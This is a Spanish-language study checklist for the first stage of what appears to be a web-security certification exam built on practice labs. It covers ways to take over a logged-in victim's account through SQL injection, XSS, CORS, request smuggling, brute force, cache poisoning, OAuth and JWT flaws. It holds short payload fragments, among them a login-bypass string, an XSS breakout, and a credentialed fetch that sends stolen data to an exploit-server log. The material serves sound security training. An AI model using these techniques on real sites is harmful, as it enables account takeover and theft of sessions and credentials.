# STAGE 1 — FOOTHOLD

> **Objetivo único:** entrar en la cuenta de un **usuario víctima que está logueado y
> navegando** la web. Cada vulnerabilidad es *un camino distinto* para lograr lo mismo.
> Independientemente de las variantes, el fin es uno: **acceder a su cuenta**.

## 🧰 Herramientas que tengo para atacar

- 📧 **Bandeja de correo** (`carlos@carlos-montoya.net` / la mía) → recibir links de reset, confirmaciones.
- 🌐 **Exploit server** → alojar y **entregar el exploit** a la víctima (HTML/JS malicioso, CSRF PoC, iframe, JS cacheado…).
- La víctima **visita** lo que le sirvo → dispara el ataque en su sesión.

## 🎯 Qué busco (lo que me da la cuenta)

1. **Sus cookies de sesión** → las pego y ya estoy dentro.
2. **Sus datos en `/my-account`** → `email`, `apiKey`, `password`.
3. **Cambiar sus credenciales** (email/password) y **recuperarlas por mi bandeja**.

## 🚦 Arranque (siempre)

- [ ] **Burp Scan** → *full domain* de fondo.
- [ ] Navegar toda la app (log/deslogueado) → poblar site map + Proxy history.
- [ ] Extensiones: **Param Miner**, **HTTP Request Smuggler**, **InQL**.
- [ ] JS del cliente → sinks: `location`, `eval`, `replace`, `addEventListener`, `postMessage`, `ng-app`.

---

## ✅ Vulnerabilidades (Stage 1)

### SQL Injection (SQLi)
> [!danger] 🚩 ¿Está o no está?
> Si hay una **cookie `TrackingId`** → **casi seguro hay SQL Injection** (suele ser **blind**). 🚩 FLAG casi asegurada.

> Fin: **bypass de login** o **extraer credenciales** de la tabla de usuarios → entrar en la cuenta.
- [ ] **Filtro de categoría** (`?category=`) → WHERE / UNION, salida visible.
- [ ] **Login** (`username`) → `administrator'--` (bypass, comenta el password).
- [ ] **Cookie `TrackingId`** → **blind** (⚠️). Si hay tracking, hay SQLi.
- [ ] **Stock check** → body XML → **filter bypass** si hay WAF.
- 📁 **Cómo explotar:** [[vulnerabilities/001-sql-injection/README|SQL Injection]] · labs: [[vulnerabilities/001-sql-injection/labs/README|labs]] · cheat sheet: [[vulnerabilities/001-sql-injection/cheat-sheet|cheat sheet]]

### Cross-Site Scripting (XSS)
> [!danger] 🚩 ¿Está o no está?
> Se **importan archivos `.js`** en la página (posible punto de inyección/robo).

> [!note] 🍪 `HttpOnly` — bifurca el camino, NO descarta el XSS
> **Mirá el flag `HttpOnly` de la cookie de sesión** (Burp → Response / DevTools) **antes** de invertir tiempo en robar la cookie:
> - `HttpOnly: false` → `document.cookie` la ve → **robo directo de cookie** (win rápido).
> - `HttpOnly: true` → **no** podés leer la cookie, pero el XSS **sigue teniendo impacto**: `fetch` same-origin a `/my-account` para rascar info (`email`, `apiKey`), **actuar en su sesión** (cambiar email/password leyendo el CSRF token), o reenviar el body. Es un ataque **más complejo** pero válido → probarlo llegado el caso. Detalle en [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|entry point → objetivos]].

> A priori se busca **obtener sus cookies**.

**Dónde probar (recon):**
- [ ] **Reflexión en el buscador** → romper el contexto HTML con `<>` (`"><svg onload=...>`).
- [ ] **XSS en comentarios** (stored) → probar también el campo **website/URL** (va a un `href`).
- [ ] **DOM:** ¿hay `document.write`? ¿`location.search`? ¿`innerHTML`? ¿`location.hash`? → seguir **source → sink** (DOM Invader).
- [ ] ¿Está corriendo **jQuery**? ¿**qué versión**? (sinks `$()`, `.html()`, `attr('href')`).
- [ ] ¿Hay **`ng-app`** / **AngularJS**? → inyección por **expresión** `{{...}}`, no HTML.
- [ ] ¿Hay **`eval`** (u otro sink que evalúe la respuesta)? → reflected DOM.
- [ ] Prototype pollution puede ser (correr extensión / DOM Invader).

**Qué hacer con él:**
- [ ] Buscador/comentario con XSS → **exfiltrar cookies** al exploit server (payloads: [[vulnerabilities/002-xss/exfil-payloads.js|exfil-payloads.js]]).
- [ ] *(extra)* Si la cookie es `HttpOnly` y no la podés robar → usar el XSS para **actuar en su sesión**: leer el CSRF token + hacer `fetch` a `/my-account` o cambiar email/password en su nombre.
- [ ] *(extra)* Exfiltrar `apiKey`/datos de `/my-account` con `fetch` same-origin desde el XSS.
- 📁 **Cómo explotar:** [[vulnerabilities/002-xss/README|XSS]] · labs: [[vulnerabilities/002-xss/labs/README|labs]] · cheat sheet: [[vulnerabilities/002-xss/cheat-sheet|cheat sheet]] · ofuscación: [[vulnerabilities/019-obfuscacion/xss-obfuscation|xss-obfuscation]]

### Cross-Site Request Forgery (CSRF)
> [!danger] 🚩 ¿Está o no está?
> **La FLAG es que exista una acción relevante *autenticada* que forjar** (cambiar email/password…). **En STAGE 1 arrancás sin cuenta → esa sección no existe para vos**, y el CSRF **por sí solo no te da acceso** a ninguna cuenta: actúa *dentro* de una sesión ya logueada, no te loguea a vos. → Su lugar natural es **[[exam/STAGE_2/STAGE_2#Cross-Site Request Forgery (CSRF)|STAGE 2]]** (contra el admin). STAGE 1 se resuelve con vías que **sí** te metan en una cuenta (XSS que roba sesión, SQLi que saca credenciales, etc.).

- [ ] *(raro en STAGE 1)* Solo tendría sentido si **(a)** podés **registrar tu propia cuenta** para mapear el endpoint **y (b)** hay una **víctima logueada** cuyo email cambiar → reset de password → su cuenta. Si no se dan las dos → **saltá CSRF en este stage**.
- 📁 **Técnica (aplica sobre todo en STAGE 2):** [[vulnerabilities/003-csrf/csrf|CSRF]] · labs: [[vulnerabilities/003-csrf/labs/README|labs]]

### Clickjacking
> [!danger] 🚩 ¿Está o no está? (las 3 juntas)
> 1. **Acción relevante y clickeable** (un botón con estado: cambiar email/password, borrar cuenta…).
> 2. **La página se deja enmarcar** → **faltan** `X-Frame-Options` **y** CSP `frame-ancestors` en la response.
> 3. Hay una **víctima logueada** cuyo clic robás (su sesión ejecuta la acción).
> Si falta cualquiera → descartá. **En STAGE 1 casi nunca aplica:** arrancás **sin cuenta** y no hay una sesión ajena que hijackear para *obtener* una cuenta → su lugar natural es **STAGE 2** (contra el admin). Ver [[exam/STAGE_2/STAGE_2#Clickjacking|STAGE 2]].

- [ ] *(raro en STAGE 1)* Solo tendría sentido si hay una **víctima ya logueada** cuyo clic robar. Si no la hay → **saltá clickjacking en este stage**.
- 📁 **Técnica (aplica sobre todo en STAGE 2):** [[vulnerabilities/004-clickjacking/clickjacking|Clickjacking]] · labs: [[vulnerabilities/004-clickjacking/labs/README|labs]]

### DOM-Based Vulnerabilities (DOM)
> [!danger] 🚩 ¿Está o no está? — **grepeá el JS del cliente**
> Abrí los `.js` del target y buscá (Ctrl+F) estas cadenas. Si aparece **`addEventListener("message"` / `postMessage(` / `eval(`** → es **altamente probable** que haya una vuln DOM-based (prioridad alta). Otros sinks: `innerHTML`, `outerHTML`, `document.write`, `location`/`location.href`, `document.cookie`, `setTimeout("…")`, `Function()`, jQuery `$()`/`.html()`. Sources controlables: `location.search/hash`, `document.referrer`, `document.cookie`, `window.name`, web messages. Lista completa → [[vulnerabilities/025-dom-based/sinks|sinks & sources]].

> [!note] 🎯 Objetivo y entrega (leé esto antes de la checklist)
> **Objetivo:** ejecutar JS en la sesión de la **víctima** → **robar su cookie** (session hijack) y entrar a su cuenta = **meta del Stage 1**. Si la cookie es `HttpOnly`, no la robás pero **actuás en su sesión** (leer su CSRF token y cambiar email/password). Mismo fin que un XSS.
> **¿Requiere exploit server? SÍ.** Estos DOM-based **no persisten** (el bug vive en el JS del cliente) → **entregás** un `<iframe>`/URL por el **exploit server** y necesitás una **víctima que lo visite**. Única excepción: **open redirect** (URL directa, para OAuth). Confirmá la visita en el **Access log**.
> **Ojo (Stage 1):** si en esta etapa **no hay víctima** a quien entregarle, un DOM-based que solo dispara con **tu propio** clic no te da acceso a otra cuenta → ahí lo viable es **robar cookies de una víctima** (si existe) o encadenar **open redirect → OAuth**. Si necesita víctima y no la hay, es más un tema de Stage 2.

- [ ] **Grepeá los sinks** de arriba en cada `.js` (sobre todo los nuevos). Cada hit → rastreá si el argumento viene de un **source** controlable (usá **DOM Invader**).
- [ ] **`addEventListener('message')` / `postMessage` sin chequeo de `event.origin`** → inyectar vía `<iframe>` que hace `postMessage` en `onload` (sink `innerHTML`/`location.href`/`JSON.parse`).
- [ ] **`eval` / `Function` / `setTimeout(str)`** → ejecución directa (reflected DOM: la respuesta reflejada se evalúa).
- [ ] **DOM open-redirect** (`location.href` con param `url`) → munición para robar **token/`code`** en flujos OAuth.
- [ ] **Cookie manipulation** (`document.cookie` como sink) y **DOM clobbering** (`window.x || {}` + HTML con `id`/`name` whitelisted) → ver entry point.
- 📁 **Cómo explotar:** [[vulnerabilities/025-dom-based/dom-based|DOM-based]] · sinks: [[vulnerabilities/025-dom-based/sinks|sinks & sources]] · labs: [[vulnerabilities/025-dom-based/labs/README|labs]] · DOM-XSS clásico: [[vulnerabilities/002-xss/README#🌳 DOM XSS — source → sink|XSS→DOM]]

### Cross-Origin Resource Sharing (CORS)
> [!danger] 🚩 FLAG — se tiene que cumplir esto (en la respuesta del endpoint de datos)
> **Las dos juntas** para robar datos con sesión:
> 1. **`Access-Control-Allow-Origin` refleja tu `Origin` arbitrario** (mandás `Origin: https://evil.com` en Repeater y **vuelve reflejado**) — o acepta **`Origin: null`**.
> 2. **`Access-Control-Allow-Credentials: true`** (necesario: sin esto no exfiltrás nada autenticado).
>
> ⚠️ **`Access-Control-Allow-Origin: *` NO cuenta** acá: el `*` es incompatible con `Allow-Credentials: true`, así que no sirve para robar la sesión (solo data pública). Buscás **reflejo** o **`null`**.

- [ ] En Repeater, a la request que trae los datos (`/accountDetails`, `/my-account`, `/api/...`), agregar `Origin: https://evil.com` → ¿lo refleja? ¿hay `Allow-Credentials: true`?
- [ ] **Objetivo:** exfiltrar `email`/`apiKey`/`password` → completar la cuenta / avanzar de stage.
- [ ] **Entrega:** exploit server con un `<script>` que hace `fetch(endpoint,{credentials:'include'})` → `location='/log?key='+…`. **Deliver to victim** y leer el **Access log**.
- 📁 **Cómo explotar:** [[vulnerabilities/005-cors/cors|CORS]] · labs: [[vulnerabilities/005-cors/labs/README|labs]]

### HTTP Request Smuggling (HRS)
> [!danger] 🚩 ¿Está o no está?
> **Correr scripts de detección** (HTTP Request Smuggler → *smuggle probe*) →
> confirma CL.TE / TE.CL.

- [ ] Emitir otra petición que haga `GET /my-account` → robar `email`/`apiKey`/`password`.
- [ ] Emitir petición que fuerce un `Set-Cookie` **que refleje las cookies** → obtener las suyas.
- [ ] **Robar su petición** por desfase de colas (capturar su request completa).
- [ ] *(por validar)* HTTP Request Smuggler → *smuggle probe*; probar **CL.TE** / **TE.CL**.
- 📁 [[vulnerabilities/008-http_smuggling/detect.py|HTTP Request Smuggling]]

### Access Control Vulnerabilities (IDOR / Broken Access Control)
> [!danger] 🚩 ¿Está o no está?
> No hay una señal única (va más por probar). Pista: **peticiones que llevan el
> nombre de usuario / `id` / GUID** manipulable (IDOR).

- [ ] `/my-account?username=carlos` (sin loguear) → ver si devuelve sus datos → `email`, `apiKey`, `password`.
- [ ] *(extra)* Cambiar `id`/GUID en URL/params/cookies → recurso ajeno. Forzar `/admin` o rutas ocultas.
- 📁 *(crear)* [[vulnerabilities/access-control/README|Access Control]]

### Authentication (Auth)
> [!danger] 🚩 ¿Está o no está?
> **Rate limit en el login** (si lo hay, es la pista: no te lo dejan tan fácil →
> dificultad mínima esperada).

- [ ] **Fuerza bruta** con las listas (~11000 peticiones) → usar scripts de [[vulnerabilities/011-brute-force/login_userenum_password.py|brute-force]].
- [ ] *(extra)* Enumeración de usuario (mensaje/tiempo distinto), bypass de 2FA / brute del código, reset poisoning, credenciales por defecto.
- [ ] *(por validar)* Rate limit → resetear contador con `X-Forwarded-For`.
- 📁 [[vulnerabilities/011-brute-force/login_userenum_password.py|brute-force]]

### Web Cache Poisoning (WCP)
> [!danger] 🚩 ¿Está o no está?
> **Sí o sí** cabeceras **`X-Cache`** (`hit`/`miss`) **+ `Age`** en la respuesta de
> un `.js` → hay caché que envenenar.

- [ ] Cachear un **JavaScript falso mío** que envíe las cookies a mi exploit server.
- [ ] *(extra)* Detectar caché (`X-Cache`, `Age`) + **Param Miner → Guess headers** para hallar el input no-keyed que envenena.
- 📁 *(crear)* · ver [[vulnerabilities/016-host-header-injection/conn_reuse.py|Host header]]

### HTTP Host Header Attacks (Host)
> [!danger] 🚩 ¿Está o no está?
> *(por definir señal)* — de momento: probar en **recuperar contraseña** si el `Host`
> manipulado termina en el link del correo.

- [ ] En **recuperar contraseña**, cambiar el `Host` → ver si el link de reset apunta a **oastify/Collaborator** (envenenamiento del reset).
- [ ] *(extra)* `X-Forwarded-Host`, doble `Host`, `Host: localhost` → bypass / acceso interno.
- 📁 [[vulnerabilities/016-host-header-injection/conn_reuse.py|Host header]]

### OAuth Authentication (OAuth)
> [!danger] 🚩 ¿Está o no está?
> **Requisito necesario:** el login debe ser **por OAuth** sí o sí (si no, no aplica).

- [ ] *(por completar)* Manipular `redirect_uri` → desviar el **authorization code** a mi exploit server → robar su sesión.
- [ ] *(por validar)* Falta de `state` → CSRF de login / account linking. Robo de `code` por `Referer`.
- 📁 **Cómo explotar:** [[vulnerabilities/026-oauth/oauth|OAuth]] *(entry point incompleto)*

### JSON Web Tokens (JWT)
> [!danger] 🚩 ¿Está o no está?
> **Requisito necesario:** el login usa **JWT** (no una session cookie simple).

- [ ] *(por completar)* Forjar token de la víctima: `alg:none`, firma no verificada, clave HS256 débil (crackear), inyección `kid`/`jwk`/`jku`.
- 📁 [[vulnerabilities/018-jwt-attacks/crack_jwt.py|JWT]]

---

## 🔎 Extras que ya teníamos (útiles)

### Content Discovery
- [ ] Burp *Discover content*, `robots.txt`, `sitemap.xml`, `/.git`, comentarios HTML, backups (`.bak`, `~`, `.old`), endpoints/API ocultos.
- 📁 [[vulnerabilities/014-information-disclousure/README|Content discovery]]

---

> [!success] Salida del Stage 1
> Cookie/sesión **o** credenciales del usuario → guardar para el **Stage 2**.

> [!todo] Pendiente de completar
> Los marcados **`?` / (por completar)** los llenamos en la próxima iteración
> (CSRF, DOM, OAuth, JWT sobre todo).
